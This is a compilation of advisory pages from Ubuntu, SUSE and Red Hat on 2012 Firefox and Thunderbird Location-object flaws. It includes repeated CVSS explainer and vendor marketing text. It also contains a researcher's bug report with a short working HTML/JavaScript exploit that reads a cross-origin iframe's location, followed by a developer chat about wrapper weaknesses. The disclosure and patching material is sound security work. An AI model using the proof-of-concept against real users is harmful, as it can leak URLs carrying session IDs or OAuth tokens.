# USN-1620-1: Firefox vulnerabilities

26 October 2012

Several security issues were fixed in Firefox.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 12.10](/security/notices?release=quantal)
* [Ubuntu 12.04](/security/notices?release=precise)
* [Ubuntu 11.10](/security/notices?release=oneiric)
* [Ubuntu 11.04](/security/notices?release=natty)
* [Ubuntu 10.04](/security/notices?release=lucid)

## Packages

* [firefox](/security/cves?package=firefox) - Mozilla Open Source web browser

## Details

Mariusz Mlynski and others discovered several flaws in Firefox that allowed

a remote attacker to conduct cross-site scripting (XSS) attacks.

([CVE-2012-4194](/security/CVE-2012-4194), [CVE-2012-4195](/security/CVE-2012-4195))

Antoine Delignat-Lavaud discovered a flaw in the way Firefox handled the

Location object. If a user were tricked into opening a specially crafted

page, a remote attacker could exploit this to bypass security protections

and perform cross-origin reading of the Location object. ([CVE-2012-4196](/security/CVE-2012-4196))

SUSE Security Update: Security update for Mozilla Firefox
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: SUSE-SU-2012:1426-1
Rating: important
References: #786522
Affected Products:
SUSE Linux Enterprise Software Development Kit 11 SP2
SUSE Linux Enterprise Server 11 SP2 for VMware
SUSE Linux Enterprise Server 11 SP2
SUSE Linux Enterprise Server 10 SP4
SUSE Linux Enterprise Desktop 11 SP2
SUSE Linux Enterprise Desktop 10 SP4
SLE SDK 10 SP4
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that contains security fixes can now be
installed. It includes two new package versions.
Description:
MozillaFirefox was updated to the 10.0.10ESR security
release.
The following issues have been fixed:
\*
MFSA 2012-90: Mozilla has fixed a number of issues
related to the Location object in order to enhance overall
security. Details for each of the current fixed issues are
below.
Thunderbird is only affected by window.location
issues through RSS feeds and extensions that load web
content.
\*
CVE-2012-4194: Security researcher Mariusz Mlynski
reported that the true value of window.location could be
shadowed by user content through the use of the valueOf
method, which can be combined with some plugins to perform
a cross-site scripting (XSS) attack on users.
\*
CVE-2012-4195: Mozilla security researcher
moz\_bug\_r\_a4 discovered that the CheckURL function in
window.location can be forced to return the wrong calling
document and principal, allowing a cross-site scripting
(XSS) attack. There is also the possibility of gaining
arbitrary code execution if the attacker can take advantage
of an add-on that interacts with the page content.
\*
CVE-2012-4196: Security researcher Antoine
Delignat-Lavaud of the PROSECCO research team at INRIA
Paris reported the ability to use property injection by
prototype to bypass security wrapper protections on the
Location object, allowing the cross-origin reading of the
Location object.

| [Description](show_bug.cgi?id=869893#c0)  Huzaifa S. Sidhpurwala    2012-10-25 04:53:15 UTC  ``` Mozilla has fixed a number of issues related to the Location object in order to enhance overall security. Details for each of the current fixed issues are below.  Thunderbird is only affected by window.location issues through RSS feeds and extensions that load web content.  Security researcher Mariusz Mlynski reported that the true value of window.location could be shadowed by user content through the use of the valueOf method, which can be combined with some plugins to perform a cross-site scripting (XSS) attack on users.   Mozilla security researcher moz_bug_r_a4 discovered that the CheckURL function in window.location can be forced to return the wrong calling document and principal, allowing a cross-site scripting (XSS) attack. There is also the possibility of gaining arbitrary code execution if the attacker can take advantage of an add-on that interacts with the page content.   Security researcher Antoine Delignat-Lavaud of the PROSECCO research team at INRIA Paris reported the ability to use property injection by prototype to bypass security wrapper protections on the Location object, allowing the cross-origin reading of the Location object.     External Reference:  <http://www.mozilla.org/security/announce/2012/mfsa2012-90.html>   Acknowledgements:  Red Hat would like to thank the Mozilla project for reporting this issue. Upstream acknowledges Mariusz Mlynski, moz_bug_r_a4 and Antoine Delignat-Lavaud as the original reporter.   ```  [Comment 1](show_bug.cgi?id=869893#c1)  errata-xmlrpc    2012-10-26 23:50:43 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5   Red Hat Enterprise Linux 6  Via RHSA-2012:1407 <https://rhn.redhat.com/errata/RHSA-2012-1407.html>   ```  [Comment 2](show_bug.cgi?id=869893#c2)  errata-xmlrpc    2012-10-29 23:46:58 UTC  ``` This issue has been addressed in following products:    Red Hat Enterprise Linux 5   Red Hat Enterprise Linux 6  Via RHSA-2012:1413 <https://rhn.redhat.com/errata/RHSA-2012-1413.html>   ``` |  |

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# USN-1620-2: Thunderbird vulnerabilities

30 October 2012

Several security issues were fixed in Thunderbird.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 12.10](/security/notices?release=quantal)
* [Ubuntu 12.04](/security/notices?release=precise)
* [Ubuntu 11.10](/security/notices?release=oneiric)
* [Ubuntu 10.04](/security/notices?release=lucid)

## Packages

* [thunderbird](/security/cves?package=thunderbird) - Mozilla Open Source mail and newsgroup client

## Details

USN-1620-1 fixed vulnerabilities in Firefox. This update provides the

corresponding updates for Thunderbird. Please note that Thunderbird is only

affected by window.location issues through RSS feeds and extensions that

load web content.

Original advisory details:

Mariusz Mlynski and others discovered several flaws in Firefox that allowed

a remote attacker to conduct cross-site scripting (XSS) attacks.

([CVE-2012-4194](/security/CVE-2012-4194), [CVE-2012-4195](/security/CVE-2012-4195))

Antoine Delignat-Lavaud discovered a flaw in the way Firefox handled the

Location object. If a user were tricked into opening a specially crafted

page, a remote attacker could exploit this to bypass security protections

and perform cross-origin reading of the Location object. ([CVE-2012-4196](/security/CVE-2012-4196))

### Reduce your security exposure

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

# Severity ratings

## Understanding Red Hat security ratings

Red Hat Product Security rates the severity of security issues found
in Red Hat products using a four-point scale (Low, Moderate,
Important, and Critical), as well as including a separate Common
Vulnerability Scoring System (CVSS) base score. These scoring systems
provide a prioritized risk assessment to help you understand and
schedule upgrades to your systems, enabling informed decisions on the
risk each issue places on your unique environment.

The four-point scale tells you how serious Red Hat considers an issue
to be, helping you judge the severity and determine the most important
updates. The scale takes into account the potential risk based on a technical analysis of the exact flaw and its type. The risk level of a flaw does not change if an exploit or worm is later released for a flaw, or if one is available before the release of a fix. A flaw will only be re-evaluated if new technical details emerge.

The following table provides severity ratings for Red Hat products and systems. For flaws specific to AI models, see [Red Hat security ratings for AI models](https://access.redhat.com/security/ai).

| **Severity ratings** | **Security flaw description** |
| --- | --- |
| **Critical impact** | This rating is given to flaws that could be easily exploited by a remote unauthenticated attacker and lead to system compromise (arbitrary code execution) without requiring user interaction, or easily cause system compromise via inference end points on AI systems. Flaws that require authentication, local or physical access to a system, or an unlikely configuration are not classified as Critical impact. These are the types of vulnerabilities that can be exploited by worms. |
| **Important impact** | This rating is given to flaws that can easily compromise the confidentiality, integrity or availability of resources. These are the types of vulnerabilities that allow local or authenticated users to gain additional privileges, allow unauthenticated remote users to view resources that should otherwise be protected by authentication or other controls, allow authenticated remote users to execute arbitrary code, allow remote users to cause a denial of service, or can cause system compromise via inference end points on AI systems. |
| **Moderate impact** | This rating is given to flaws that may be more difficult to exploit but could still lead to some compromise of the confidentiality, integrity or availability of resources under certain circumstances. It is also given to flaws that could be exploited to cause denial of service-like conditions on AI systems via an inference end point, or allow attackers to steal other users’ data from the AI system without authorization. These are the types of vulnerabilities that could have had a Critical or Important impact but are less easily exploited based on a technical evaluation of the flaw and/or affect unlikely configurations. || **Low impact** | This rating is given to all other issues that may have a security impact. These are the types of vulnerabilities that are believed to require unlikely circumstances to be able to be exploited, or where a successful exploit would give minimal consequences. This includes flaws that are present in a program’s source code but to which no current or theoretically possible, but unproven, exploitation vectors exist or were found during the technical analysis of the flaw. |

A Red Hat security advisory can contain fixes for more than one
vulnerability and for packages for more than one product (such as both
Red Hat Enterprise Linux 7 and 8). Each issue in an advisory has a
severity rating for each product. The overall severity of an advisory
is the highest severity out of all the individual issues, across all
the products the advisory targets. For simplicity, advisories only
show the overall severity. The advisories contain links to the
relevant entries in Red Hat's bug-tracking system, where you can
examine individual severity ratings and additional commentary, as well
as links to the relevant pages in Red Hat’s CVE database.

When a technology—enabled and most likely used by default—completely
blocks the exploitation of a particular vulnerability across all
architectures, we will adjust the severity level. When a technology
reduces the risk of a vulnerability, we may adjust the severity level
and give an explanation of the decision in the bug-tracking  and CVE
database entries.

## Common Vulnerability Scoring System (CVSS)

Common Vulnerability Scoring System (CVSS) base scores provide
additional guidance about a vulnerability, giving a detailed severity
rating by scoring the constant aspects of a vulnerability: Attack
Vector, Attack Complexity, User Interaction, Privileges Required,
Scope, Confidentiality, Integrity, and Availability.

CVSS version 2 base metrics are available for all vulnerabilities from
2009-2016, as well as selected earlier vulnerabilities. In 2016, Red
Hat adopted the CVSS v3 standard, and all vulnerabilities going
forward will use version 3.1 for scoring. These scores are found on
the
[CVE pages](https://access.redhat.com/security/security-updates/#/cve)
(linked from the References section of each Red Hat Security Advisory).

Red Hat does not solely use the CVSS rating to determine the priority
with which flaws are fixed, or to determine the severity rating of the
vulnerability. It is used as a guideline to identify and describe key
metrics of a flaw, however the priority for which flaws are fixed is
determined by the overall severity of the flaw using the
aforementioned four-point scale.  CVSS is meant to help customers
prioritize the order in which they remediate flaws.

### CVSS v3 Base Metrics

The CVSS v3 base metrics group covers the constant aspects of a
vulnerability:

* Attack Vector (AV) - Expresses the "remoteness" of the attack and
  how the vulnerability is exploited.
* Attack Complexity (AC) - Speaks to the difficulty of executing an
  attack and what factors are needed for it to be successful. (Along
  with User Interaction, Attack Complexity was formerly part of the
  Access Complexity metric.).
* User Interaction (UI) - Determines whether the attack requires an
  active human to participate or if the attack can be automated.
* Privileges Required (PR) - Documents the level of user
  authentication required for the attack to be successful. (This
  replaces the former Authentication metric.).
* Scope (S) - Determines whether an attacker can impact a component
  beyond its security scope/authority.
* Confidentiality (C) - Determines whether unauthorized parties can
  access data and to what extent.
* Integrity (I) - Measures the impact to the trustworthiness and
  veracity of data.
* Availability (A) - Refers to the impact to accessibility of data or
  services for authorized users.

A formula translates these measurements into a single, numerical base
score, ranging from 0.0 (no risk) to 10.0 (highest risk). Refer to
[Common Vulnerability Scoring System v3.1: User Guide](https://www.first.org/cvss/user-guide)
for detailed descriptions of the base metrics. It is important to note
that the CVSS base metrics were designed to be used with the other
CVSS metric groups, notably the Temporal and Environmental metrics, to
provide an accurate representation of risk in customer environments.
Alone, the Base metrics offer a shallow view of the vulnerability
itself without accounting for deployment or the environment.

### How Red Hat Uses CVSS v3 Base Metrics

We aim to comply with the CVSS v3 standard when assigning base scores,
and Red Hat uses base metrics that reflect how a vulnerability affects
our products specifically.  In addition, we do not use the Qualitative
Severity Rating Scale in the CVSS v3.1 User Guide to rate severity,
and our severity ratings are always based on the aforementioned
four-point scale.  In some circumstances, it may not be obvious why a
flaw received a particular score. The following are some common
vulnerability types with our interpretation and typical scoring:

#### Libraries

It is not always possible to know how third-party applications use
libraries, making it difficult to give accurate CVSS v3 base metrics
for flaws in system libraries. When rating these flaws, we take into
account the way the library is used by applications that we ship, and
also look at other popular software that may use the library in a way
that would cause an issue to be of higher severity, and adjust the
score appropriately.

#### Other Common Scores

Flaws where a local, unprivileged user can cause a kernel to crash
(denial of service) typically score 5.5 (for example,
[CVE-2019-9213](https://access.redhat.com/security/cve/CVE-2019-9213)).

Flaws that allow a local, unprivileged user to escalate their
privileges to root typically score 7.8 (for example,
[CVE-2019-18634](https://access.redhat.com/security/cve/CVE-2019-18634)).

Cross-site scripting flaws are generally scored as having Low impact
to Integrity and/or Confidentiality, with no impact to Availability,
in line with scoring from other vendors and NVD. A typical score for
these flaws is 6.1 (for example,
[CVE-2020-11023](https://access.redhat.com/security/cve/CVE-2020-11023)).

### Base Score Variations Across Products

It is common for a given CVE-named vulnerability to have several
different CVSS base metrics, depending on the product, version, and
architecture. Examples of this include:

* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## Topic

Updated firefox packages that fix multiple security issues are now
available for Red Hat Enterprise Linux 5 and 6.

The Red Hat Security Response Team has rated this update as having critical
security impact. Common Vulnerability Scoring System (CVSS) base scores,
which give detailed severity ratings, are available for each vulnerability
from the CVE links in the References section.

## Description

Mozilla Firefox is an open source web browser. XULRunner provides the XUL
Runtime environment for Mozilla Firefox.

Multiple flaws were found in the location object implementation in Firefox.
Malicious content could be used to perform cross-site scripting attacks,
bypass the same-origin policy, or cause Firefox to execute arbitrary code.
(CVE-2012-4194, CVE-2012-4195, CVE-2012-4196)

For technical details regarding these flaws, refer to the Mozilla security
advisories for Firefox 10.0.10 ESR. You can find a link to the Mozilla
advisories in the References section of this erratum.

Red Hat would like to thank the Mozilla project for reporting these issues.
Upstream acknowledges Mariusz Mlynski, moz\_bug\_r\_a4, and Antoine
Delignat-Lavaud as the original reporters of these issues.

All Firefox users should upgrade to these updated packages, which contain
Firefox version 10.0.10 ESR, which corrects these issues. After installing
the update, Firefox must be restarted for the changes to take effect.

User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
Steps to reproduce:
Firefox 16.0.0 suffered from a nasty bug allowing cross-origin access to window.location, which can be easily exploited to steal session ids or OAuth tokens on many websites, including high profile ones.
Even though 16.0.1 fiexed the immediate bug, this called into question the effectiveness of the wrappers intended to protect the location object. Our research team PROSECCO at INRIA Paris is currently building formal analysis tools for JavaScript and while investigating the wrapped native prototype and global scope polluter implementation, we found that they suffered from a bottom-up property injection by prototype that can be exploited to recover cross-origin locations.
The following minimal exploit should be self-explanatory:
<html>
<head>
<script type="text/javascript">
window.onload = function()
{
f = document.getElementById('f');
loc = f.contentWindow.location;
loc2 = {toString: loc.toString};
loc2.\_\_proto\_\_ = f.contentWindow.location;
f.src = "<http://www.mozilla.com>";
}
</script>
</head>
<body>
<iframe id="f" src="about:blank"></iframe>
<input type="button" onclick="alert(loc2.toString());" value="Get URL" />
</body>
</html>
Actual results:
Clicking the Get URL button reveals the current and complete location of the frame
Expected results:
As soon as the frame's location was changed to mozilla.com access to the location should have been impossible

Just before midnight on saturday May 12th, I was sitting in a bar in Toulouse and I started worrying that something like this might be possible. I pinged mrbkap on monday (May 14th), and here's the conversation we had:
[12:54pm] bholley: let me know when you've got some time to talk about security stuff
[3:11pm] mrbkap: Hey, I'm here now.
[4:54pm] bholley: still there?
[5:03pm] mrbkap: Hey, yeah.
[5:03pm] bholley: got some time to talk about security stuff?
[5:04pm] mrbkap: Yeah.
[5:04pm] bholley: so, I've been getting concerned about our security wrapper story
[5:05pm] mrbkap: ok
[5:05pm] bholley: specifically with respect to call/apply
[5:05pm] bholley: as in, we filter out access to various properties on certain objects, but then we can just call/apply them from somewhere else
[5:05pm] mrbkap: ok
[5:06pm] bholley: I've been digging through this, and I \_think\_ we're covered by various things in most places
[5:07pm] bholley: but it's pretty tenuous
[5:07pm] mrbkap: The only place where I'm not entirely sure is COWs, I think.
[5:07pm] bholley: for things that use XPCCallContext, methods and attributes are essentially pre-bound, because of the logic in XPCWrappedNative::GetWrappedNativeForJSObject
[5:07pm] mrbkap: For what objects and what functions?
[5:09pm] bholley: well, so suppose I apply document.getElementById to crossOriginIframe.contentDocument
[5:09pm] mrbkap: That tries to unwrap this, which will throw when it encounters a cross origin anything.
[5:09pm] bholley: mrbkap: because of SCRIPT\_ACCESS\_ONLY, right?
[5:09pm] mrbkap: This is the reason that Xray wrapper functions are effectively bound functions right now.
[5:10pm] mrbkap: Right.
[5:10pm] mrbkap: They skip that particular security check.
[5:11pm] bholley: mrbkap: ok. Xrays are the only way to do anything cross-origin
[5:11pm] bholley: however, there are a few other cases
[5:12pm] bholley: well, hm
[5:12pm] bholley: so, there's Location
[5:12pm] bholley: but I guess that's always an Xray
[5:12pm] mrbkap: Right.
[5:12pm] bholley: but here's a related problem with Location:
[5:13pm] mrbkap: So, I admit that I based a lot of the security guarantees on the limited nature of what content can do cross-origin.
[5:13pm] bholley: what's to stop you from pulling a method off of the Location object when it's same-origin, and then apply()ing it once it's cross-origin?
[5:14pm] mrbkap: hmm
[5:14pm] bholley: it seems like the capability model doesn't work there
[5:15pm] bholley: we should probably make Location SCRIPT\_ACCESS\_ONLY
[5:15pm] mrbkap: It should be already no? Since it's an Xray?
[5:15pm] mrbkap: Location always had to be special because it does the dynamic check.
[5:16pm] bholley: mrbkap: see LW in FilteringWrapper.cpp
[5:17pm] mrbkap: Right.
[5:17pm] mrbkap: But see AccessCheck::isScriptAccessOnly.
